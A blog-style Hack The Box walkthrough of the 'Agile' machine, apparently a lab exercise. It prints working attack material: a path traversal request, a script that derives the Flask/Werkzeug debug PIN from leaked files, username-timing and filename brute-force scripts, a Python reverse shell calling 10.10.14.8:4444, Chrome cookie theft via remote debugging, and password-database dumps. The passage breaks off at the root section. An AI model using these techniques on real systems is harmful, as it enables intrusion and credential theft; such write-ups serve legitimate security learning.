---
layout: post
title: Hack The Box Walkthrough - Agile
date: 2023-04-16
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2023/04/HTB/Agile
img: 2023/04/Agile/Agile.png
---

In Agile, I had to exploit a password manager to read arbitrary files on a server. I used the information from those files to generate the PIN for the Flask debug console. Then, I read the cookies from Chrome running in debug to access the password of another user. And finally, used `sudoedit` to gain root access.

* Room: Agile
* Difficulty: Medium
* URL: [https://app.hackthebox.com/machines/Agile](https://app.hackthebox.com/machines/Agile)
* Author: [0xdf](https://app.hackthebox.com/users/4935)

## Enumeration

As always, I started the box by looking for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.11.203:22
Open 10.10.11.203:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-15 17:49 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:49

...

Nmap scan report for target (10.10.11.203)
Host is up, received conn-refused (0.025s latency).
Scanned at 2023-03-15 17:49:15 EDT for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCeVL2Hl8/LXWurlu46JyqOyvUHtAwTrz1EYdY5dXVi9BfpPwsPTf+zzflV+CGdflQRNFKPDS8RJuiXQa40xs9o=
|   256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEcaZPDjlx21ppN0y2dNT1Jb8aPZwfvugIeN6wdUH1cK
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:49
Completed NSE at 17:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:49
Completed NSE at 17:49, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:49
Completed NSE at 17:49, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.58 seconds
```

There were 2 open ports: 22 (SSH) and 80 (HTTP).

The website was redirecting to 'superpass.htb'. I added that to my hosts file and checked for subdomains.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -X POST -t30 --hw 12 -H "Host:FUZZ.superpass.htb" "http://superpass.htb"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://superpass.htb/
Total requests: 648201

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================


Total time: 0
Processed Requests: 648201
Filtered Requests: 648201
Requests/sec.: 0
```

It did not find anything. Same for UDP scan.

```bash
$ sudo nmap -sU target -oN nmapUdp.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-15 17:50 EDT
Nmap scan report for target (10.10.11.203)
Host is up (0.027s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 1010.10 seconds
```

## Website

I opened a browser and navigated to 'http://superpass.htb'.

![SuperPassword Site](/assets/images/2023/04/Agile/SuperPassSite.png "SuperPassword Site")

It was a password manager. I ran Feroxbuster to look for hidden pages, but everything it found was redirecting to the login page.

![Login Page](/assets/images/2023/04/Agile/Login.png "Login Page")

I tried simple SQL and NoSQL injection payloads in the login form. Nothing worked, but the site kept throwing errors.

![Errors](/assets/images/2023/04/Agile/ErrorOnLogin.png "Errors")

It was a Flask app deployed in debug mode. The error page had buttons to access the debug console, but it required a PIN.

I used the 'Register' page to create an account and log in the application.

![Vault](/assets/images/2023/04/Agile/Vault.png "Vault")

Once logged in, I was able to add passwords to the vault, and export them.

I tried using `flask-unsign` to crack the Flask session cookie with no luck.

```bash
$ flask-unsign --unsign --cookie '.eJwlzjEOwzAIAMC_MHewgYDJZyJiQO2aNFPVvzdS51vuA1sdeT5hfR9XPmB7BaygREnUXHNahqQzMpG1bqUkrMWFSN3CzW4tHTI6Kk5H8d0jVaa6OZlbaFMxDqlR0tBmYx6Yfei-hA0WGr4IlfalocRu0wTuyHXm8d_0Bt8flrUuKQ.ZBWqpA.WZ-VyfH3Row6THCWm9FyCNu6QAE' --wordlist /usr/share/seclists/rockyou.txt --no-literal-eval

[*] Session decodes to: {'_fresh': True, '_id': '733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96', '_user_id': '10'}
[*] Starting brute-forcer with 8 threads..
[!] Failed to find secret key after 14344391 attempts.
```

## Export
I added a password and tried to export it. The export button sent a GET request to '/vault/export', and I got redirected to the download URL.

```http
HTTP/1.1 302 FOUND
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 16 Apr 2023 13:25:16 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 265
Connection: close
Location: /download?fn=eric_export_13aadad0bc.csv
Vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/download?fn=eric_export_13aadad0bc.csv">/download?fn=eric_export_13aadad0bc.csv</a>. If not, click the link.
```

The URL I was redirected to was interesting. It contained my username, the word 'export', and what looked like 10 random characters.

The other interesting part of the URL is that the `fn` parameter looked like it could be used to read files from the server. I tried reading '/etc/passwd'.

```http
GET /download?fn=/etc/passwd HTTP/1.1
Host: superpass.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: session=.eJwljsFqwzAQRH9F7DkUSSvvav0VvZcQ1tIqNrhNsZxTyL9X0NMwvGF4L7i1XftqHeavF7hzBHxb73o3uMDnbtrN7Y-7237c-XBayoDuXLfufsfmA67v62WcHNZXmM_jaaNtFWZgREP0ylbEKpmmmBDFB2mMlLilFiMGqSoyaONMOUSORSPpotWYCqsoikplzySpUsuNfJTiU8rRQuZlqpITYdaJsHGYfKS6SBEa-rdnt-PfRuD9B50hRQ4.ZDvz-A.3Ri1VIq6RfG6L31fotq9jVmQUnQ; remember_token=9|06f2a54da39a00d8b83c296b2cdd42872300f44c0adc8b2eb5204fa4d009f3c0894223a3fdddb0bf8d957de25bf18b176382eebe3b42102eef98a381fc28b4d1
Upgrade-Insecure-Requests: 1
```

It gave me an error.

```http
HTTP/1.1 500 INTERNAL SERVER ERROR
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 16 Apr 2023 13:30:10 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 13534
Connection: close

<!doctype html>
<html lang=en>
  <head>
    <title>FileNotFoundError: [Errno 2] No such file or directory: '/tmp//etc/passwd'
 // Werkzeug Debugger</title>

 ...
```

But the error showed that the path I gave was appended to '/tmp/'. I tried again by adding '..' at the beginning of my path.

```http
GET /download?fn=../etc/passwd HTTP/1.1
Host: superpass.htb
...
```

I got the file back.

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 15 Mar 2023 23:11:05 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 1744
Connection: keep-alive
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
corum:x:1000:1000:corum:/home/corum:/bin/bash
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
_laurel:x:999:999::/var/log/laurel:/bin/false
```

From [OpenSource](https://erichogue.ca/2022/10/HTB/OpenSource), I knew that if I could read files for the server, I could generate the Flask debugging console PIN. I extracted the information I needed and generated the PIN. I failed. I spent a lot of time trying to generate the correct PIN, re-extracting all the files, using different users, ... Everything failed.

I use the file read vulnerability to extract all the sites source files.

I found a password in a configuration file.

```json
{"SQL_URI": "mysql+pymysql://superpassuser:REDACTED@localhost/superpass"}
```

I tried connecting to the application and SSH with that password. It failed.

## Passwords Export Brute Force

From the source code, I found how the export filename was generated.

```python
def generate_csv(user):

    rand = get_random(10)
    fn = f'{user.username}_export_{rand}.csv'
    path = f'/tmp/{fn}'

def get_random(chars=20):
    return hashlib.md5(str(datetime.datetime.now()).encode() + b"SeCReT?!").hexdigest()[:chars]
```

The code was using the first 10 characters of the MD5 hash of the current time to generate the 'random' part of the filename. I thought this might be vulnerable, but I did not know any other usernames. And I could not know when any other users would have used the export.

I tried it anyway. I looked at the login code.

```python
def login_user(username: str, password: str) -> Optional[User]:
    session = db_session.create_session()
    user = session.query(User).filter(User.username == username).first()

    if user and hasher.verify(password, user.hashed_password):
        session.close()
        return user
    session.close()
    return None
```

The code was reading the user from the database. And if the user existed, it would try to verify the hash. From this I knew that a login request would take longer if the username existed in the database. I wrote a script to find usernames.

```python

import requests
import sys

def try_username(username):
    url = 'http://superpass.htb/account/login'
    data = {'username': username, 'password': 'aaa'}

    response = requests.post(url, data)

    return response.elapsed.total_seconds() > 0.1

if len(sys.argv) != 2:
    print(f"Usage:\n{sys.argv[0]} FILENAME\n")
    exit()

filename = sys.argv[1]
file = open(filename, 'r')
count = 0
for line in file:
    username = line.strip()
    if try_username(username):
        print(username)

    count += 1
    if count % 100 == 0:
        print(count, file=sys.stderr)
```

I ran the script, but it returned way too many false positive. The fact that I was trying other things while it ran probably did not help.

From the passwd file, I knew that the box had a user called 'corum', so I tried to brute force their export filename. I did not have much hope. The code used microseconds, it made for way too many possibilities. But I tried anyway.

```python
#!/usr/bin/env python3

import datetime
import hashlib
import requests

session = ".eJwlzjEOwzAIAMC_MHewgYDJZyJiQO2aNFPVvzdS51vuA1sdeT5hfR9XPmB7BaygREnUXHNahqQzMpG1bqUkrMWFSN3CzW4tHTI6Kk5H8d0jVaa6OZlbaFMxDqlR0tBmYx6Yfei-hA0WGr4IlfalocRu0wTuyHXm8d8YfH9o4y4B.ZBdL1A.pWh1lNi9qX-RudtQzK-GIiKP5Ig"

def request_file(file_name, use_proxy):
    proxy_servers = {
        'http': 'http://localhost:8080',
    }

    s = requests.Session()
    if use_proxy:
        s.proxies = proxy_servers

    url = f'http://superpass.htb/download?fn={file_name}'
    cookie = {"session": session}
    response = s.get(url, cookies=cookie)

    if 200 == response.status_code:
        return response.text.strip()

    return ''

chars = 10
time = datetime.datetime.now()
delta = datetime.timedelta(microseconds=-1)
count = 0

while True:
    use_proxy = False
    if count % 100 == 0:
        print(time)
        use_proxy = True

    rand =  (hashlib.md5(str(time).encode() + b"SeCReT?!").hexdigest()[:chars])
    file = f'corum_export_{rand}.csv'
    value = request_file(file, use_proxy)
    if value:
        print(file)
        print(value)
        exit()

    time = time + delta
    count += 1
```

I ran the script for a while. It did not find any existing export file.

## Finally The PIN

After losing a few hours, I went back to trying to generate the PIN.

I used the file read vulnerability to see how the application was executed. It used [venv](https://docs.python.org/3/library/venv.html).

```http
GET /download?fn=../proc/self/cmdline HTTP/1.1
```

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 16 Apr 2023 14:41:03 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 103
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

/app/venv/bin/python3�/app/venv/bin/gunicorn�--bind�127.0.0.1:5000�--threads=10�--timeout�600�wsgi:app�
```

I tried running it locally to see if any values would be different. After way too long, I found that I needed to use 'wsgi_app' instead of 'Flask' for the application name.

I used the file extracted from the server to create a script that would read the needed data and generate a PIN.

```python
#!/usr/bin/env python3

import hashlib
import typing as t
from itertools import chain
import requests

session = ".eJydjsFqwzAQRH9F7NkUSyvvav0VvZcQ1tIqNrhNsJxTyL9X0D_oaRjeDDMvuNZd22oN5q8XuLMLfFtrejMY4HM3beb2-81tP-68O825Q3euW3OPnvmAy3v4Z-8y9PHD2grzeTytu63ADIxoiKOyZbFCpjFERBm9VEaKXGMNAb0UFem0cqLkA4esgXTRYkyZVRRFpfDIJLFQTZXGIHmMMQXziZepSIqESSfCyn4aA5VFslC_f302O_7eeA_vXysbV8k.ZDwLUw.zWd1Hqq-2N6BReHdfEWT5Y7_8zM"

def request_file(file_name):
    proxy_servers = {
        'http': 'http://localhost:8080',
    }

    s = requests.Session()
    s.proxies = proxy_servers

    url = f'http://superpass.htb/download?fn=..{file_name}'
    cookie = {"session": session}
    response = s.get(url, cookies=cookie)

    if 200 == response.status_code:
        return response.text.strip()

    return ''

def get_node():
    file = '/sys/class/net/eth0/address'
    address = request_file(file)
    address = address.replace(':', '')
    return int(address, 16)

def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
    def _generate() -> t.Optional[t.Union[str, bytes]]:
        linux = b""

        # machine-id is stable across boots, boot_id is not.
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
            try:
                value = request_file(filename).encode()
            except OSError:
                continue

            if value:
                linux += value
                break

        # Containers share the same machine id, add some cgroup
        # information. This is used outside containers too but should be
        # relatively stable across boots.
        try:
            linux += request_file("/proc/self/cgroup").encode().rpartition(b"/")[2]
        except OSError:
            pass

        if linux:
            return linux

        return None

    return _generate()



def get_pin_and_cookie_name() -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:
    """Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.

    Second item in the resulting tuple is the cookie name for remembering.
    """
    rv = None
    num = None

    modname = 'flask.app' #getattr(app, "__module__", t.cast(object, app).__class__.__module__)
    username = 'www-data' #getpass.getuser()

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        username,
        modname,
        'wsgi_app', #getattr(app, "__name__", type(app).__name__),
        '/app/venv/lib/python3.10/site-packages/flask/app.py' #getattr(mod, "__file__", None),
    ]
    print(probably_public_bits)

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    node = get_node()
    machine_id = get_machine_id()
    private_bits = [str(node), machine_id]
    print(private_bits)

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv, cookie_name

print(get_pin_and_cookie_name())
```

I generated the PIN.

```bash
$ ./generate_pin.py
['www-data', 'flask.app', 'wsgi_app', '/app/venv/lib/python3.10/site-packages/flask/app.py']
['345052395813', b'ed5b159560f54721827644bc9b220d00superpass.service']
('135-148-084', '__wzd663740a50e34b3fe93a8')
```

I was able to use it in the debug console. And from there, getting a reverse shell was easy.

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.203] 55078
/bin/sh: 0: can't access tty; job control turned off

$ whoami
www-data
```

## User corum

Once connected to the server, I tried using the MySQL credentials to read the database. MySQL did not work well in the reverse shell, so I use [Chisel](https://github.com/jpillora/chisel) to open a reverse tunnel.


I opened the server on my machine.

```bash
./chisel server -p 3477 --reverse
```

And connected to it from the server.

```bash
./chisel client 10.10.14.8:3477 R:3306:127.0.0.1:3306/tcp
```

With the tunnel opened, I was able to use the MySQL client on my machine to connect to the MySQL server on the box.

```sql
mysql -usuperpassuser -h 127.0.0.1 -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 1587
Server version: 8.0.32-0ubuntu0.22.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> Show Databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| superpass          |
+--------------------+
3 rows in set (0.030 sec)

MySQL [(none)]> use superpass;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [superpass]> show Tables;
+---------------------+
| Tables_in_superpass |
+---------------------+
| passwords           |
| users               |
+---------------------+
2 rows in set (0.030 sec)

MySQL [superpass]> Select * From users;
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
| id | username | hashed_password                                                                                                          |
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
|  1 | 0xdf     | $6$rounds=200000$FRtvqJFfrU7DSyT7$8eGzz8Yk7vTVKudEiFBCL1T7O4bXl0.yJlzN0jp.q0choSIBfMqvxVIjdjzStZUYg6mSRB2Vep0qELyyr0fqF. |
|  2 | corum    | $6$rounds=200000$yRvGjY1MIzQelmMX$9273p66QtJQb9afrbAzugxVFaBhb9lyhp62cirpxJEOfmIlCy/LILzFxsyWj/mZwubzWylr3iaQ13e4zmfFfB1 |
|  9 | test     | $6$rounds=200000$qtpXF3.PgPs00aap$00/amN.zFZsYv0UMyiq6bnq67oVTpL..gs0Ec3EYzUgqsanb0AMARM3nDaS68Z8BEzQKQshjvB2WCEmbNMAHM1 |
| 10 | 2        | $6$rounds=200000$PPdQzGEsBknhgI77$hBKpjOlgS08Q3SX6VUsF.8tIjwm.AcVhzhWxZotZ2WxI3m/x2IB0I/l3u94OeWK3PKSbI242.u9rj4Sj7nGUy0 |
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
4 rows in set (0.026 sec)

MySQL [superpass]> Select * From passwords;
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
| id | created_date        | last_updated_data   | url            | username | password             | user_id |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | REDACTED |       2 |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
```

I tried to crack the hashes in the users table with hashcat, but that failed. The passwords table contained the passwords in clear text. I tried them to SSH as corum, the last one worked.

```bash
$ ssh corum@target
The authenticity of host 'target (10.10.11.203)' can't be established.
ED25519 key fingerprint is SHA256:kxY+4fRgoCr8yE48B5Lb02EqxyyUN9uk6i/ZIH4H1pc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
corum@target's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login: Wed Mar  8 15:25:35 2023 from 10.10.14.47

corum@agile:~$ ls
user.txt

corum@agile:~$ cat user.txt
REDACTED
```

## User edwards

Once on the server, I looked at ways to get more privileges.

```bash
corum@agile:~$ sudo -l
[sudo] password for corum:
Sorry, user corum may not run sudo on agile.

corum@agile:~$ find / -perm /u=s 2>/dev/null
/usr/libexec/polkit-agent-helper-1
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/opt/google/chrome/chrome-sandbox

corum@agile:~$ ls -la /opt/google/chrome/chrome-sandbox
-rwsr-xr-x 1 root root 219584 Dec  1 22:29 /opt/google/chrome/chrome-sandbox
```

The Chrome sandbox had the suid bit set. I tried to run it, but I did not see how to abuse it.

When I ran `ps`, I saw Chrome again.

```bash
corum@agile:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  2.5  0.2 100648 11088 ?        Ss   23:47   0:02 /sbin/init
root           2  0.0  0.0      0     0 ?        S    23:47   0:00 [kthreadd]

...

runner      1123  0.0  0.0 33575872 2640 ?       Sl   23:48   0:00 /opt/google/chrome/chrome_crashpad_handler --monitor-self-annotation=ptype=crashpad-handler --database=/tmp --url=https://clients2.google.com/cr/report --annotation=cha
runner      1128  0.0  1.4 33822084 56956 ?      S    23:48   0:00 /opt/google/chrome/chrome --type=zygote --no-zygote-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=1123 --enable-crash-reporter
runner      1129  0.0  1.4 33822072 56784 ?      S    23:48   0:00 /opt/google/chrome/chrome --type=zygote --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=1123 --enable-crash-reporter
runner      1131  0.0  0.3 33822096 15332 ?      S    23:48   0:00 /opt/google/chrome/chrome --type=zygote --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=1123 --enable-crash-reporter
runner      1145  0.3  1.8 33916488 75516 ?      Sl   23:48   0:00 /opt/google/chrome/chrome --type=gpu-process --enable-logging --headless --log-level=0 --ozone-platform=headless --use-angle=swiftshader-webgl --headless --crashpad-han
runner      1147  0.2  2.0 33871408 82816 ?      Sl   23:48   0:00 /opt/google/chrome/chrome --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --enable-logging --log-level=0 --use-a
runner      1177  2.8  3.9 1184764352 157824 ?   Sl   23:48   0:01 /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=1123 --lang=en-US --enable-automation --enable-logging --log-level=0 --remote-debugging-port
root        1192  0.1  0.2  17176 10868 ?        Ss   23:48   0:00 sshd: corum [priv]
corum       1195  0.1  0.2  17056  9440 ?        Ss   23:48   0:00 /lib/systemd/systemd --user
```

Chrome was running with remote debugging enabled.

```bash
runner      1177  2.8  3.9 1184764352 157824 ?   Sl   23:48   0:01 /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=1123 --lang=en-US --enable-automation --enable-logging --log-level=0 --remote-debugging-port
root        1192  0.1  0.2  17176 10868 ?        Ss   23:48   0:00 sshd: corum [priv]
corum       1195  0.1  0.2  17056  9440 ?        Ss   23:48   0:00 /lib/systemd/systemd --user
```

After some research, I found a [blog post](https://mango.pdf.zone/stealing-chrome-cookies-without-a-password) and a [GitHub repository](https://github.com/defaultnamehere/cookie_crimes) that explained how to use the Chrome API to read all the cookies from an instance running with remote debugging.

I started an SSH tunnel to be able to reach the Chrome debugging API from my machine.

```bash
$ ssh -L 9222:localhost:41829 corum@target
corum@target's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)
```

I had to make a few changes to the script to get it to work, but I got it to extract the cookies to a test version of the password manager.

```bash
$ python cookie_crimes.py
[
    {
        "domain": "test.superpass.htb",
        "expires": 1711497543.559996,
        "httpOnly": true,
        "name": "remember_token",
        "path": "/",
        "priority": "Medium",
        "sameParty": false,
        "secure": false,
        "session": false,
        "size": 144,
        "sourcePort": 80,
        "sourceScheme": "NonSecure",
        "value": "1|REDACTED"
    },
    {
        "domain": "test.superpass.htb",
        "expires": -1,
        "httpOnly": true,
        "name": "session",
        "path": "/",
        "priority": "Medium",
        "sameParty": false,
        "secure": false,
        "session": true,
        "size": 215,
        "sourcePort": 80,
        "sourceScheme": "NonSecure",
        "value": "REDACTED"
    }
]
```

I looked at the configuration and saw that I could access the application directly on port 5555.

```bash
corum@agile:~$ cat /etc/nginx/sites-enabled/superpass-test.nginx
server {
    listen 127.0.0.1:80;
    server_name test.superpass.htb;

    location /static {
        alias /app/app-testing/superpass/static;
        expires 365d;
    }
    location / {
        include uwsgi_params;
        proxy_pass http://127.0.0.1:5555;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-Protocol $scheme;
    }
}
```

I started a new SSH tunnel on port 5555.

```bash
$ ssh -L 5555:127.0.0.1:5555 corum@target
corum@target's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)
```

I opened a browser to 'http://localhost:5555/' and I got served the test instance. I used the developer's tools of the browser to add the session cookie I stole.

![Test Vault](/assets/images/2023/04/Agile/TestVault.png "Test Vault")

I used edwards' password to SSH on the server.

```bash
$ ssh edwards@target
edwards@target's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)

```

## Root

Once connected as edwards, I looked at what they could run with sudo.

```bash
edwards@agile:~$ sudo -l
[sudo] password for edwards:
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

They were able to edit two files as dev_admin.

The first file contains some database credentials.

```bash
edwards@agile:~$ sudoedit -u dev_admin /app/config_test.json
